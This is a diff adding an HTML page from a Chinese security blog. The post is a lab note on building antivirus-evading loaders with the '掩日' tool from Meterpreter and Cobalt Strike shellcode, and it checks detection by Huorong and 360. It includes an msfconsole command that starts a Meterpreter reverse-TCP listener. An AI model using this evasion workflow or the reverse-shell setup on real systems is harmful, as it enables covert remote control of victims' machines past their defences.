@@ -1,0 +1,359 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
+    
+    <title>免杀实验笔记之掩日免杀 | GMF信息小站</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
+    <meta name="keywords" content="givemefivw, POC&EXP, Web安全, 渗透测试, 编程语言" >
+    <meta name="description" content="信息安全小站" >
+
+    
+    <link rel="alternative" href="/atom.xml" title="GMF信息小站" type="application/atom+xml" >
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico" >
+    
+    
+<link rel="stylesheet" href="/css/style.css?v=1616236472750.css">
+
+    <!--[if lt IE 9]>
+    
+<script src="/js/html5.js"></script>
+
+    <![endif]-->
+    
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a target="_blank" rel="noopener" href="http://browsehappy.com/">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">GMF信息小站</span>
+                    <span class="description">Welcom to My Blog :)</span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/givemefivw" target="_blank">Github</a>
+                        |
+                    
+                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
+                        
+                    
+                </p>
+                <p class="sns">
+                    
+                        <a href="https://www.facebook.com/profile.php?id=100057569016241" class="FaceBook" target="_blank"><b>■</b> FaceBook</a>
+                    
+                        <a href="https://twitter.com/cawk07666665?s=09" class="Twitter" target="_blank"><b>■</b> Twitter</a>
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>免杀实验笔记之掩日免杀</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        givemefivw 发表于
+        <time datetime="2021-03-20T10:32:15.000Z">2021-03-20</time>
+    </p>
+    <div id="JELON__articlePostContent" class="post-content">
+        <h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><p>2.0 依赖：</p>
+<ol>
+<li><p>64位 Windows 7、8、10 操作系统</p>
+</li>
+<li><p>.net framework 4.0或更高版本 (Windows 自带)</p>
+</li>
+<li><p>tdm-gcc （<a target="_blank" rel="noopener" href="https://github.com/jmeubank/tdm-gcc/releases/download/v9.2.0-tdm64-1/tdm64-gcc-9.2.0.exe%EF%BC%89">https://github.com/jmeubank/tdm-gcc/releases/download/v9.2.0-tdm64-1/tdm64-gcc-9.2.0.exe）</a></p>
+</li>
+</ol>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>打开软件，页面如下<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/1.png"><br>点击如何生成Shellcode，会弹出一个框图，如下：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/2.png"><br>将攻击机ip填入，监听port根据自己需求根本更改，最后如下：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/3.png"><br>将工具生成的语句复制下来，在kali运行：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/4.png"><br>复制生成的Shellcode，粘贴在工具下方：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/5.png"><br>运行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit&#x2F;multi&#x2F;handler;set payload windows&#x2F;meterpreter&#x2F;reverse_tcp;set lhost 192.168.230.128;set lport 4444;run;&quot;</span><br></pre></td></tr></table></figure>
+<p>启动监听：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/6.png"><br>点击生成免杀执行器，选择保存位置和名称：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/8.png"><br>作者给了一个小建议：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/7.png"><br>运行上线：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/9.png"></p>
+<h2 id="查看免杀效果"><a href="#查看免杀效果" class="headerlink" title="查看免杀效果"></a>查看免杀效果</h2><p>静态下火绒无反应，360报毒：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/10.png"><br>动态下也是如此：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/11.png"></p>
+<h2 id="Cobalt-Strike免杀"><a href="#Cobalt-Strike免杀" class="headerlink" title="Cobalt Strike免杀"></a>Cobalt Strike免杀</h2><p>设置好监听，生成C的Shellcode：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/12.png"><br>将生成的.c文件打开，复制里面的Shellcode，粘贴到掩日工具中：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/13.png"><br>运行上线：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/14.png"></p>
+<h2 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h2><p>静态下，仍然是火绒无反应，360报毒：<br><img src="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/15.png"></p>
+<p>只针对了一种方式进行测试，其他的可以自行探索。</p>
+
+    </div>
+    <p class="eof">-- EOF --</p>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            <a class="cat-link" href="/categories/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">免杀实验笔记</a>
+        </span>
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+  <div class="article-share clearfix text-center">
+    <div class="share-area">
+      <span class="share-txt">分享到：</span>
+      <a href="javascript: window.open('http://service.weibo.com/share/share.php?url=' + encodeURIComponent(location.href) + '&title=' + document.title + '&language=zh_cn');" class="share-icon weibo"></a>
+      <a href="javascript: alert('请复制链接到微信并发送');" class="share-icon wechat"></a>
+      <a href="javascript: window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(location.href) + '&title=' + document.title);" class="share-icon qqzone"></a>
+      <a href="javascript: window.open('http://connect.qq.com/widget/shareqq/index.html?url=' + encodeURIComponent(location.href) + '&desc=Jelon个人博客&title=' + document.title + '&callback=' + encodeURIComponent(location.href));" class="share-icon qq"></a>
+      <a href="javascript: window.open('http://shuo.douban.com/!service/share?href=' + encodeURIComponent(location.href) + '&name=' + document.title + '&text=' + document.title);" class="share-icon douban"></a>
+    </div>
+  </div>
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br >
+        <a href="javascript: void(0);">没有上一篇了</a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br >
+        <a href="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+            
+                Apache Solor 任意文件读取漏洞
+            
+        </a>
+    </span>
+    
+</div>
+
+<!-- 文章评论 -->
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章搜索</strong></h3>
+        <div class="search-form">
+  <form
+    id="searchForm"
+    method="GET"
+    action="https://www.baidu.com/s"
+    ectype="application/x-www-form-urlencoded"
+    target="_blank"
+    autocomplete="false"
+    onsubmit="javascript: return false;">
+    <input
+      id="searchKeyword"
+      type="text"
+      class="form-control"
+      placeholder="输入关键字搜索"
+      autocomplete="false"
+    />
+    <input id="searchKeywordHidden" type="hidden" name="wd" />
+    <input id="searchButton" class="btn" type="submit" value="搜索" />
+  </form>
+</div>
+    </section>
+    
+
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2019/">CVE-2019</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2020/">CVE-2020</a>
+        <span class="badge">(9)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2012/">CVE-2012</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CNVD-2019/">CNVD-2019</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2016/">CVE-2016</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2014/">CVE-2014</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2017/">CVE-2017</a>
+        <span class="badge">(5)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2018/">CVE-2018</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2021/">CVE-2021</a>
+        <span class="badge">(5)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%9D%82%E9%A1%B9%E6%BC%8F%E6%B4%9E/">杂项漏洞</a>
+        <span class="badge">(11)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">免杀实验笔记</a>
+        <span class="badge">(6)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (13)</a>
+  
+    <a class="tag-item" href="/tags/POC/" title="POC">POC (20)</a>
+  
+    <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (6)</a>
+  
+    <a class="tag-item" href="/tags/%E4%B9%8B%E6%88%91%E8%A7%81/" title="之我见">之我见 (1)</a>
+  
+    <a class="tag-item" href="/tags/%E8%84%9A%E6%9C%AC/" title="脚本">脚本 (1)</a>
+  
+    <a class="tag-item" href="/tags/PoC/" title="PoC">PoC (3)</a>
+  
+    <a class="tag-item" href="/tags/%E9%9A%8F%E7%AC%94/" title="随笔">随笔 (2)</a>
+  
+    <a class="tag-item" href="/tags/EXP/" title="EXP">EXP (2)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://github.com/givemefivw" target="_blank" title="Github博客">Github博客</a>
+        </li>
+    
+        <li>
+            <a href="https://givemefivw.github.io/" target="_blank" title="Sec H博客">Sec H博客</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2021
+    
+
+    <a href="/">Jelon Loves You</a>
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+
+<script src="/js/main.js?v=1616236472752.js"></script>
+
+
+</body>
+</html>
